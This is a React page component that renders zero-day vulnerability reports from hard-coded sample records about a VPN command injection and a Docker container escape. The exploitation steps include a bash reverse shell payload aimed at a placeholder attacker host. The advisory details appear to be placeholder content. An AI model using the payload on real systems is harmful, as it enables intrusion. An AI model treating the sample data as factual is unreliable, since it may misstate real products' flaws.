import { useParams, Link } from 'react-router-dom';
import { motion } from 'framer-motion';
import { AnimatedGridBackground } from '../../components/shared/AnimatedGridBackground';
import { Button } from '../../components/ui/button';
import { Badge } from '../../components/ui/badge';
import { 
  AlertTriangle,
  ArrowLeft, 
  Calendar, 
  Shield,
  Target,
  Zap,
  Bug,
  Lock,
  Unlock,
  Clock,
  Eye,
  FileText,
  Download,
  Share2,
  ExternalLink,
  CheckCircle,
  Building2,
  Package,
  Code,
  Terminal,
  Lock as LockIcon
} from 'lucide-react';

interface ZeroDayReport {
  id: string;
  title: string;
  vendor: string;
  product: string;
  severity: 'Critical' | 'High' | 'Medium';
  status: 'Active' | 'Patched' | 'Under Review';
  discoveryDate: string;
  disclosureDate?: string;
  cveId?: string;
  attackVector: string;
  impact: string;
  description: string;
  technicalAnalysis: string;
  exploitationSteps: string[];
  indicators: string[];
  affectedVersions: string[];
  patches?: string[];
  workarounds: string[];
  timeline: { date: string; event: string }[];
  tags: string[];
  vxrtVerified: boolean;
  researcher: string;
}

const zeroDayReports: Record<string, ZeroDayReport> = {
  '1': {
    id: '1',
    title: 'Critical RCE in Enterprise VPN Appliance',
    vendor: 'Palo Alto Networks',
    product: 'GlobalProtect',
    severity: 'Critical',
    status: 'Active',
    discoveryDate: '2024-03-10',
    attackVector: 'Network - Unauthenticated',
    impact: 'Remote Code Execution, Data Exfiltration',
    description: 'A pre-auth command injection vulnerability in the GlobalProtect portal allows unauthenticated attackers to execute arbitrary code with root privileges.',
    technicalAnalysis: `
## Vulnerability Analysis

### Root Cause
The vulnerability exists in the GlobalProtect portal's handling of SAML authentication responses. Specifically, the /sslmgr endpoint fails to properly sanitize user-controlled input before passing it to system shell commands.

### Attack Flow
1. Attacker sends crafted HTTP request to /sslmgr endpoint
2. Malicious payload bypasses initial input validation
3. Command injection occurs in exec() call
4. Root-level shell access achieved

### Affected Components
- GlobalProtect Portal (TCP/443)
- SAML authentication module
- sslmgr daemon

### CVSS 3.1 Score: 9.8 (Critical)
- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    `,
    exploitationSteps: [
      'Identify GlobalProtect portal endpoint (typically /global-protect/login.esp)',
      'Craft malicious SAML assertion with command injection payload',
      'Send authentication request with crafted SAML response',
      'Inject reverse shell payload: $(bash -i >& /dev/tcp/ATTACKER/PORT 0>&1)',
      'Receive root shell on attacker listener',
      'Pivot to internal network via established access'
    ],
    indicators: [
      'POST /sslmgr requests with encoded payloads',
      'Unexpected /tmp/gpauth* file creation',
      'Abnormal sslmgr process spawn patterns',
      'Network connections from sslmgr to external IPs'
    ],
    affectedVersions: [
      'GlobalProtect < 6.2.1',
      'PAN-OS < 11.1.0',
      'PAN-OS 10.2.x < 10.2.5'
    ],
    patches: [
      'Upgrade to GlobalProtect 6.2.1 or later',
      'Apply PAN-OS 11.1.0+ with hotfix PAN-SA-2024-0001'
    ],
    workarounds: [
      'Disable GlobalProtect Portal if not required',
      'Implement strict WAF rules for /sslmgr endpoint',
      'Enable "verify-integrity" on SAML responses',
      'Restrict portal access via source IP allowlist'
    ],
    timeline: [
      { date: '2024-03-10', event: 'Vulnerability discovered by VXRT researcher' },
      { date: '2024-03-11', event: 'Initial report submitted to vendor' },
      { date: '2024-03-15', event: 'Vendor acknowledged receipt' },
      { date: '2024-03-20', event: 'VXRT threat assessment completed' },
      { date: '2024-03-22', event: 'Active exploitation detected in wild' },
      { date: '2024-03-25', event: 'Priority notification sent to affected clients' }
    ],
    tags: ['RCE', 'VPN', 'Command Injection', 'Pre-auth', 'Network'],
    vxrtVerified: true,
    researcher: 'Dr. Sarah Chen'
  },
  '2': {
    id: '2',
    title: 'Privilege Escalation in Container Runtime',
    vendor: 'Docker',
    product: 'Docker Engine',
    severity: 'High',
    status: 'Patched',
    discoveryDate: '2024-02-15',
    disclosureDate: '2024-02-28',
    cveId: 'CVE-2024-24557',
    attackVector: 'Local - Low Privilege',
    impact: 'Container Escape, Host Access',
    description: 'A race condition in Docker Engine allows attackers with container access to escape to the host and gain root privileges.',
    technicalAnalysis: 'Technical analysis would be here...',
    exploitationSteps: [
      'Create specially crafted container image',
      'Trigger race condition during container start',
      'Access host filesystem through leaked fd',
      'Escalate to root via host /etc/passwd modification'
    ],
    indicators: [
      'Container processes with host PID namespace',
      'Unexpected mounts of host /proc',
      'Docker daemon error patterns'
    ],
    affectedVersions: ['Docker Engine < 25.0.2'],
    patches: ['Update to Docker Engine 25.0.2 or later'],
    workarounds: ['Enable user namespaces', 'Use rootless Docker mode'],
    timeline: [
      { date: '2024-02-15', event: 'Vulnerability discovered' },
      { date: '2024-02-20', event: 'Vendor notified' },
      { date: '2024-02-28', event: 'Patch released and public disclosure' }
    ],
    tags: ['Container Escape', 'Race Condition', 'Privilege Escalation'],
    vxrtVerified: true,
    researcher: 'Marcus Rodriguez'
  }
};

const severityColors = {
  'Critical': 'bg-red-500/20 text-red-500 border-red-500/50',
  'High': 'bg-orange-500/20 text-orange-500 border-orange-500/50',
  'Medium': 'bg-yellow-500/20 text-yellow-500 border-yellow-500/50'
};

const statusColors = {
  'Active': 'bg-red-500 text-white',
  'Patched': 'bg-green-500 text-white',
  'Under Review': 'bg-yellow-500 text-black'
};

export function ZeroDayReportDetailPage() {
  const { id } = useParams<{ id: string }>();
  const report = id ? zeroDayReports[id] : null;

  if (!report) {
    return (
      <div className="w-full bg-void-black min-h-screen flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="text-center"
        >
          <AlertTriangle className="w-16 h-16 text-steel-gray mx-auto mb-4" />
          <h2 className="text-2xl font-heading font-bold text-ghost-white mb-2">Report Not Found</h2>
          <p className="text-muted-gray mb-6">The zero-day report you're looking for doesn't exist.</p>
          <Link to="/resources/zero-day">
            <Button className="bg-exploit-red hover:bg-exploit-red/90">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Reports
            </Button>
          </Link>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="w-full bg-void-black min-h-screen pb-24">
      {/* Hero Section */}
      <section className="relative pt-24 pb-12 overflow-hidden">
        <AnimatedGridBackground />
        <div className="container mx-auto px-4 relative z-10">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <Link to="/resources/zero-day">
              <Button variant="ghost" className="text-muted-gray hover:text-ghost-white mb-6">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Zero-Day Reports
              </Button>
            </Link>

            {/* Status Banner */}
            <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-lg mb-4 ${statusColors[report.status]}`}>
              {report.status === 'Active' && <Unlock className="w-4 h-4" />}
              {report.status === 'Patched' && <Lock className="w-4 h-4" />}
              {report.status === 'Under Review' && <Clock className="w-4 h-4" />}
              <span className="font-semibold">{report.status}</span>
            </div>

            <h1 className="text-3xl md:text-4xl font-heading font-bold text-ghost-white mb-4 max-w-4xl">
              {report.title}
            </h1>

            <div className="flex flex-wrap items-center gap-4 mb-6">
              <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-lg border ${severityColors[report.severity]}`}>
                <Zap className="w-5 h-5" />
                <span className="font-bold">{report.severity}</span>
              </div>

              {report.vxrtVerified && (
                <Badge className="bg-exploit-red/20 text-exploit-red border-exploit-red/30">
                  <Shield className="w-4 h-4 mr-1" />
                  VXRT Verified
                </Badge>
              )}

              {report.cveId && (
                <code className="text-sm font-mono text-ghost-white bg-steel-gray/30 px-3 py-1 rounded">
                  {report.cveId}
                </code>
              )}
            </div>

            <div className="flex flex-wrap items-center gap-6 text-sm text-muted-gray">
              <span className="flex items-center gap-2">
                <Building2 className="w-4 h-4" />
                {report.vendor}
              </span>
              <span className="flex items-center gap-2">
                <Package className="w-4 h-4" />
                {report.product}
              </span>
              <span className="flex items-center gap-2">
                <Calendar className="w-4 h-4" />
                Discovered: {report.discoveryDate}
              </span>
              {report.disclosureDate && (
                <span className="flex items-center gap-2">
                  <Calendar className="w-4 h-4" />
                  Disclosed: {report.disclosureDate}
                </span>
              )}
              <span className="flex items-center gap-2">
                <Eye className="w-4 h-4" />
                Researcher: {report.researcher}
              </span>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Content */}
      <section className="py-12">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
            {/* Main Content */}
            <div className="lg:col-span-2 space-y-6">
              {/* Description */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.2 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <FileText className="w-5 h-5 text-exploit-red" />
                  Summary
                </h2>
                <p className="text-muted-gray leading-relaxed">
                  {report.description}
                </p>
                <div className="grid grid-cols-2 gap-4 mt-6 pt-6 border-t border-steel-gray/30">
                  <div>
                    <p className="text-sm text-muted-gray mb-1">Attack Vector</p>
                    <p className="text-ghost-white font-medium flex items-center gap-2">
                      <Target className="w-4 h-4 text-exploit-red" />
                      {report.attackVector}
                    </p>
                  </div>
                  <div>
                    <p className="text-sm text-muted-gray mb-1">Impact</p>
                    <p className="text-ghost-white font-medium flex items-center gap-2">
                      <Bug className="w-4 h-4 text-exploit-red" />
                      {report.impact}
                    </p>
                  </div>
                </div>
              </motion.div>

              {/* Technical Analysis */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-exploit-red" />
                  Technical Analysis
                </h2>
                <div className="text-muted-gray leading-relaxed whitespace-pre-line">
                  {report.technicalAnalysis}
                </div>
              </motion.div>

              {/* Exploitation Steps */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <Code className="w-5 h-5 text-exploit-red" />
                  Exploitation Steps
                </h2>
                <div className="space-y-4">
                  {report.exploitationSteps.map((step, i) => (
                    <div key={i} className="flex gap-4">
                      <div className="shrink-0 w-8 h-8 bg-exploit-red/20 rounded-lg flex items-center justify-center">
                        <span className="text-sm font-bold text-exploit-red">{i + 1}</span>
                      </div>
                      <p className="text-muted-gray pt-1.5">{step}</p>
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* Workarounds */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="bg-exploit-red/5 border border-exploit-red/20 rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <LockIcon className="w-5 h-5 text-exploit-red" />
                  Immediate Mitigations
                </h2>
                <ul className="space-y-3">
                  {report.workarounds.map((workaround, i) => (
                    <li key={i} className="flex items-start gap-3 text-muted-gray">
                      <CheckCircle className="w-5 h-5 text-exploit-red shrink-0 mt-0.5" />
                      <span>{workaround}</span>
                    </li>
                  ))}
                </ul>
              </motion.div>
            </div>

            {/* Sidebar */}
            <div className="space-y-6">
              {/* Affected Versions */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.3 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">Affected Versions</h3>
                <div className="space-y-2">
                  {report.affectedVersions.map((version, i) => (
                    <div key={i} className="flex items-center gap-2 text-sm text-muted-gray">
                      <AlertTriangle className="w-4 h-4 text-orange-500" />
                      {version}
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* Indicators */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.4 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">IOC Indicators</h3>
                <div className="space-y-2">
                  {report.indicators.map((indicator, i) => (
                    <div key={i} className="p-2 bg-void-black rounded text-xs text-muted-gray font-mono">
                      {indicator}
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* Timeline */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.5 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">Timeline</h3>
                <div className="space-y-3">
                  {report.timeline.map((event, i) => (
                    <div key={i} className="flex gap-3">
                      <div className="shrink-0 w-2 h-2 bg-exploit-red rounded-full mt-1.5" />
                      <div>
                        <p className="text-xs text-muted-gray">{event.date}</p>
                        <p className="text-sm text-ghost-white">{event.event}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* Actions */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.6 }}
                className="space-y-3"
              >
                <Button className="w-full bg-exploit-red hover:bg-exploit-red/90">
                  <Download className="w-4 h-4 mr-2" />
                  Download Full Report
                </Button>
                <Button variant="outline" className="w-full border-steel-gray text-ghost-white hover:border-exploit-red">
                  <Share2 className="w-4 h-4 mr-2" />
                  Share Report
                </Button>
              </motion.div>

              {/* Tags */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.7 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">Tags</h3>
                <div className="flex flex-wrap gap-2">
                  {report.tags.map((tag) => (
                    <span
                      key={tag}
                      className="px-3 py-1 bg-void-black border border-steel-gray rounded-full text-xs text-muted-gray hover:border-exploit-red/50 transition-colors"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </motion.div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}

export default ZeroDayReportDetailPage;
